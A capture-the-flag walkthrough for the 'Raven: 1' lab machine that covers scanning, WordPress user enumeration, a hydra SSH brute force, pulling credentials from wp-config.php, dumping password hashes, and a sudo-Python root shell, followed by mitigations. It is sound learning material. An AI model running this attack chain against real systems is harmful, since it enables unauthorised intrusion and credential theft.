# Raven: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Raven: 1 |
| Series | Raven |
| Author | William McCann |
| Release Date | 14 Aug 2018 |
| Difficulty | Easy–Medium |
| OS | Linux |

## 🔍 Overview

Raven: 1 is a Linux machine involving WordPress user enumeration, SSH brute-forcing, extraction of database credentials from `wp-config.php`, WordPress user hash cracking, and privilege escalation through a passwordless sudo rule on Python.

**Machine Details**

- Target IP: `192.168.1.16`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Scanning

```bash
nmap -T4 -A -p- 192.168.1.16
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH — OpenSSH 6.7p1 |
| 80/tcp | Apache httpd 2.4.10 (Raven Security) |
| 111/tcp | rpcbind |

---

## Step 2 – Web Enumeration

```bash
gobuster dir -u http://192.168.1.16 -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/wordpress` directory.

---

## Step 3 – WordPress User Enumeration

```bash
wpscan --url http://192.168.1.16/wordpress -e u
```

**Users found:** `michael`, `steven`

---

## Step 4 – SSH Brute Force (Michael)

```bash
hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -t 4 -f
```

**Password recovered** for the `michael` account.

---

## Step 5 – SSH Login

```bash
ssh michael@192.168.1.16
```

**Result:** Successfully authenticated as `michael`.

---

## Step 6 – Extract Database Credentials

```bash
cat /var/www/html/wordpress/wp-config.php | grep -i "user\|pass\|db"
```

**Found:** WordPress database name, username, and password stored in plaintext within the configuration file.

---

## Step 7 – Query WordPress Users from the Database

```bash
mysql -u root -p<db_password> wordpress -e "SELECT user_login, user_pass FROM wp_users;"
```

**Output:** Password hashes for both `michael` and `steven` WordPress accounts.

---

## Step 8 – Switch to Steven

```bash
su steven
```

Steven's system password was recovered via hash cracking of the WordPress password hash extracted in the previous step.

**Result:** Successfully switched to the `steven` account.

---

## Step 9 – Check Sudo Privileges

```bash
sudo -l
```

**Result:**

```
User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
```

---

## Step 10 – Privilege Escalation to Root

```bash
sudo python -c 'import os; os.system("/bin/sh")'
```

Since `steven` could run Python as root with no password, spawning a shell from within Python inherited root privileges.

**Result:** Root shell obtained.

---

## Step 11 – Flag Capture

```bash
cd /root
cat flag4.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. WordPress user enumeration possible via WPScan, exposing valid usernames
2. Weak SSH password for the `michael` account, crackable via brute force
3. Database credentials stored in plaintext within `wp-config.php`, readable by the web server user
4. Weak WordPress password hash for `steven`, crackable offline
5. Passwordless sudo access to Python, allowing trivial privilege escalation to root

## 🩹 Mitigations

1. Disable or restrict WordPress user enumeration (e.g., via security plugins or server-level rules)
2. Enforce strong, non-dictionary passwords for SSH and database accounts
3. Restrict file permissions on `wp-config.php` and ensure it isn't readable by unauthorized users
4. Use strong, modern password hashing for WordPress accounts and enforce strong user passwords
5. Restrict sudo privileges to only the specific commands required — never grant NOPASSWD access to interpreters like Python, which can trivially spawn a shell
6. Prefer SSH key-based authentication over passwords

---

## 🧰 Tools Used

`nmap` · `gobuster` · `wpscan` · `hydra` · `ssh` · `mysql`

## 🧠 Techniques Covered

Network scanning · Web/WordPress enumeration · SSH brute-forcing · Database credential extraction · WordPress hash cracking · Sudo misconfiguration exploitation · Privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Scanning | ✅ |
| 2 | Web Enumeration | ✅ |
| 3 | WordPress User Enumeration | ✅ |
| 4 | SSH Brute Force (Michael) | ✅ |
| 5 | SSH Login | ✅ |
| 6 | Extract Database Credentials | ✅ |
| 7 | Query WordPress Users from Database | ✅ |
| 8 | Switch to Steven | ✅ |
| 9 | Check Sudo Privileges | ✅ |
| 10 | Privilege Escalation to Root | ✅ |
| 11 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "Raven" series.*
